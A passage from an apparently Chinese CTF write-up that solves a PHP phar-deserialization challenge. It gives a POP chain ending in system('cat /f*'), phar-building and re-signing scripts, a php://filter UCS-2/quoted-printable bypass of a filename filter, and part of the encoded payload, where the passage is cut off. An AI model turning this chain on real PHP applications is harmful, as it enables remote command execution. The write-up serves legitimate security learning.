language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>();<br>        &#125;<br>        <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;view/file.html&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请输入文件名&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&lt;textarea class=&quot;file_content&quot; type=&quot;text&quot; value=&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$contents</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;这不合理&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;write&#x27;</span>]))&#123;<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$contents</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;该文件不存在或者内容为空&quot;</span>);<br>            &#125; <br>        &#125;<br><br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$log</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>            (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="代码审计-（只是看代码得出的信息，没有实际操作）"><a href="#代码审计-（只是看代码得出的信息，没有实际操作）" class="headerlink" title="代码审计  （只是看代码得出的信息，没有实际操作）"></a>代码审计  （只是看代码得出的信息，没有实际操作）</h3><p>有两个页面，第一个登陆界面，<code>username=admin,password=admin</code>登录跳转</p><p>第二个页面能够读取文件，若搜索的内容不存在会被写入<code>/var/www/html/log/error.txt</code>中，能够重写文件中的内容</p><ul><li><code>Files.class.php</code>的<code>getFile()</code>的<code>file_get_contents()</code>存在phar反序列化漏洞</li><li>三个文件中存在pop链</li></ul><h3 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">User::__destruct <span class="hljs-punctuation">-&gt;</span> User::check <span class="hljs-punctuation">-&gt;</span> Myerror::__toString <span class="hljs-punctuation">-&gt;</span> Files::__get<br></code></pre></td></tr></table></figure><p>这里比较难的是User::__destruct中的<code>(@$this-&gt;password)();</code>要使用数组调用函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$name</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;password = [<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;check&quot;</span>];<br><span class="hljs-variable">$b</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;test = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">&quot;cat /f*&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>题目中没发现<code>unserialize()</code>，但能查看文件，想到phar反序列化，那<code>phar://</code>又要解析什么文件呢？</p><p>我们想到<code>log/error.txt</code>的内容为报错信息</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/a5WEKMOeYP8zcHg.png" alt="image.png"></p><p>但其中有脏数据，使用<code>php://filter</code>去除</p><p>先想到最后要把phar文件内容之外的变为非合法字符，然后base64-decode，就只剩phar文件的内容</p><p>那如何转化呢，由<code>utf-8</code>转换为<code>utf-16le</code>的字符，它的每一位字符后面都会加上一个<code>\0</code>，这个<code>\0</code>是不可见字符，但当我们将<code>utf-16le</code>转换为<code>utf-8</code>的时候，只有后面有<code>\0</code>的才会被正常转换，其它的就会被当成乱码<img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817062542437.png" alt="image-20230817062542437"></p><p>但<code>utf-16le</code>被ban了，<code>ucs-2</code>的功能与它相同</p><p>然后要对<code>\0</code>进行处理，使用quoted-printable编码</p><p>即：把phar文件内容依次经过<code>base64-encode</code>、<code>convert.iconv.utf-8.ucs-2</code>、<code>quoted-printable-encode</code></p><p>把结果写入log&#x2F;error.txt</p><p>在解码时先<code>quoted-printable-decode</code>、再<code>convert.iconv.ucs-2.utf-8</code>、最后<code>base64-decode</code></p><h3 id="GC回收机制"><a href="#GC回收机制" class="headerlink" title="GC回收机制"></a>GC回收机制</h3><p>在最后解密完后，要<code>phar://</code>，但是phar被ban了</p><p>为了不让它异常退出，这里使用GC回收机制在<code>throw new Error(&quot;这不合理&quot;);</code>之前提前触发__destruct</p><h3 id="最后顺序与实际操作"><a href="#最后顺序与实际操作" class="headerlink" title="最后顺序与实际操作"></a>最后顺序与实际操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$name</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;password = [<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;check&quot;</span>];<br><span class="hljs-variable">$b</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;test = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">&quot;cat /f*&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;a.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>修改内容，最后的<code>i:1</code>改为<code>i:0</code></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/e4p73WRYbfEic9d.png" alt="image.png"></p><p>修改phar文件内容后要重新进行签名</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">from hashlib <span class="hljs-keyword">import</span> sha1<br>f = open(<span class="hljs-string">&#x27;a.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() <span class="hljs-meta"># 修改内容后的phar文件</span><br>s = f[:<span class="hljs-type">-28</span>] <span class="hljs-meta"># 获取要签名的数据</span><br>h = f[<span class="hljs-number">-8</span>:<span class="hljs-type"></span>] <span class="hljs-meta"># 获取签名类型以及GBMB标识</span><br><span class="hljs-keyword">new</span><span class="hljs-type">f</span> = s+sha1(s).digest()+h <span class="hljs-meta"># 数据 + 签名 + 类型 + GBMB</span><br>open(<span class="hljs-string">&#x27;phar4.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(<span class="hljs-keyword">new</span><span class="hljs-type">f</span>) <span class="hljs-meta"># 写入新文件</span><br></code></pre></td></tr></table></figure><p>然后再拿去加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar4.phar&#x27;</span>);<span class="hljs-comment">//获取二进制数据</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>,<span class="hljs-string">&#x27;UCS-2&#x27;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//UCS-2编码</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-title function_ invoke__">quoted_printable_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//quoted_printable编码</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/=\r\n/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>)).<span class="hljs-string">&#x27;=00=3D&#x27;</span>);<span class="hljs-comment">//解决软换行导致的编码结构破坏</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>file_put_contents在最后加上&#x3D;00&#x3D;3D是因为在<code>php://filter/convert.iconv.ucs-2.utf-8</code>后会出现个陌生字符</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/E9KxOJMRwmf3qYX.png" alt="image.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">=00R=<span class="hljs-number">000</span>=00l=00G=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=00l=<span class="hljs-number">00h</span>=<span class="hljs-number">00P</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">009</span>=00w=00a=<span class="hljs-number">00H</span>=00A=00g=00X=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=00I=<span class="hljs-number">00Q</span>=00U=00x=00U=00X=<span class="hljs-number">000</span>=00N=<span class="hljs-number">00P</span>=<span class="hljs-number">00T</span>=00V=<span class="hljs-number">00B</span>=00J=<span class="hljs-number">00T</span>=00E=00V=00S=00K=00C=00k=<span class="hljs-number">007</span>=00I=<span class="hljs-number">00D</span>=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>+=<span class="hljs-number">00D</span>=<span class="hljs-number">00Q</span>=<span class="hljs-number">00o</span>=00w=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00B</span>=00E=00A=00A=00A=00A=<span class="hljs-number">00B</span>=00A=00A=00A=00A=00A=00A=<span class="hljs-number">00D</span>=<span class="hljs-number">005</span>=00A=00A=00A=00A=<span class="hljs-number">00Y</span>=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00A=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">000</span>=<span class="hljs-number">00O</span>=00i=00J=00V=00c=<span class="hljs-number">002</span>=00V=<span class="hljs-number">00y</span>=00I=00j=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=00z=<span class="hljs-number">00O</span>=00j=00g=<span class="hljs-number">006</span>=00I=00n=00V=00z=00Z=00X=00J=00u=<span class="hljs-number">00Y</span>=00W=<span class="hljs-number">001</span>=00l=00I=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00c=00G=00F=00z=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00d</span>=00v=00c=00m=<span class="hljs-number">00Q</span>=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">002</span>=00E=<span class="hljs-number">006</span>=00M=00j=<span class="hljs-number">00p</span>=<span class="hljs-number">007</span>=00a=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=00w=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00V=00X=00N=00l=00c=00i=00I=<span class="hljs-number">006</span>=00M=00j=<span class="hljs-number">00p</span>=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">004</span>=<span class="hljs-number">00O</span>=00i=00J=<span class="hljs-number">001</span>=00c=<span class="hljs-number">002</span>=00V=<span class="hljs-number">00y</span>=<span class="hljs-number">00b</span>=00m=00F=<span class="hljs-number">00t</span>=00Z=00S=00I=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">003</span>=<span class="hljs-number">00O</span>=00i=00J=00N=00e=00W=00V=<span class="hljs-number">00y</span>=00c=00m=<span class="hljs-number">009</span>=<span class="hljs-number">00y</span>=00I=00j=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=00z=<span class="hljs-number">00O</span>=00j=00c=<span class="hljs-number">006</span>=00I=00m=<span class="hljs-number">001</span>=00l=00c=<span class="hljs-number">003</span>=00N=<span class="hljs-number">00h</span>=00Z=<span class="hljs-number">002</span>=00U=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=00i=00R=00m=00l=00s=00Z=00X=00M=00i=<span class="hljs-number">00O</span>=00j=00I=<span class="hljs-number">006</span>=00e=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00Z=00m=00l=00s=00Z=00W=<span class="hljs-number">005</span>=<span class="hljs-number">00h</span>=<span class="hljs-number">00b</span>=00W=00U=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">004</span>=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=00z=<span class="hljs-number">00O</span>=00i=00J=<span class="hljs-number">00h</span>=00c=00m=00c=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=00N=00z=<span class="hljs-number">00o</span>=00i=<span class="hljs-number">00Y</span>=<span class="hljs-number">002</span>=00F=<span class="hljs-number">000</span>=00I=00C=<span class="hljs-number">009</span>=00m=00K=00i=00I=<span class="hljs-number">007</span>=00f=00X=00M=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=<span class="hljs-number">00d</span>=00G=00V=00z=<span class="hljs-number">00d</span>=00C=00I=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">002</span>=<span class="hljs-number">00O</span>=00i=00J=00z=00e=00X=00N=<span class="hljs-number">000</span>=00Z=00W=<span class="hljs-number">000</span>=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=00z=<span class="hljs-number">00O</span>=00j=00g=<span class="hljs-number">006</span>=00I=00n=<span class="hljs-number">00B</span>=<span class="hljs-number">00h</span>=00c=<span class="hljs-number">003</span>=00N=<span class="hljs-number">003</span>=<span class="hljs-number">00b</span>=<span class="hljs-number">003</span>=00J=00k=00I=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00E=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00O</span>=00i=00J=00j=00a=00G=00V=00j=00a=<span class="hljs-number">00y</span>=00I=<span class="hljs-number">007</span>=00f=00X=<span class="hljs-number">001</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00A=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">009</span>=00C=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00H</span>=00R=00l=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00Q</span>=00x=00L=00n=00R=<span class="hljs-number">004</span>=<span class="hljs-number">00d</span>=00A=00U=00A=00A=00A=<span class="hljs-number">00B</span>=00W=00V=00N=<span class="hljs-number">001</span>=00k=<span class="hljs-number">00B</span>=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00O</span>=00L=00c=00s=<span class="hljs-number">00o</span>=<span class="hljs-number">00q</span>=<span class="hljs-number">002</span>=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=00A=00A=00A=00A=<span class="hljs-number">00H</span>=00R=00l=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00Q</span>=00x=00I=00z=00S=00g=00V=00I=00G=<span class="hljs-number">007</span>=00m=00l=<span class="hljs-number">007</span>=00G=00e=<span class="hljs-number">00B</span>=<span class="hljs-number">00t</span>=00l=00l=00I=<span class="hljs-number">00b</span>=<span class="hljs-number">008</span>=00e=00l=00l=00l=00v=00s=<span 